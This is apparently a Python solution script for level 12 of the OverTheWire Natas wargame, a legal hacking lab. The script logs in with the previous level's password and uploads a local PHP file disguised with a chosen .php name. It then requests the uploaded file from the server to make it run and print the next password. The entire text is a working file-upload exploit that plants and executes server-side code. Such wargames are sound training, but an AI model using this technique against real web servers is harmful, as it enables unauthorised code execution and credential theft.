import requests
from requests.auth import HTTPBasicAuth
import natas11solution

auth = HTTPBasicAuth('natas12', natas11solution.get_pass())
def get_pass():
    dat = {'filename':'sa439i6682.php'}
    f = {'uploadedfile': open('getpass.php', 'rb')}
    r = requests.post('http://natas12.natas.labs.overthewire.org/', auth=auth, files=f, data=dat)
    webcontent = r.text
   # print(webcontent)
    i = webcontent.find('The file <a href="upload/')+18
    url = 'http://natas12.natas.labs.overthewire.org/' + webcontent[i:i+21]
    r = requests.get(url, auth=auth)
    webcontent = r.text.strip()
    #print(webcontent)
    s = webcontent   
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
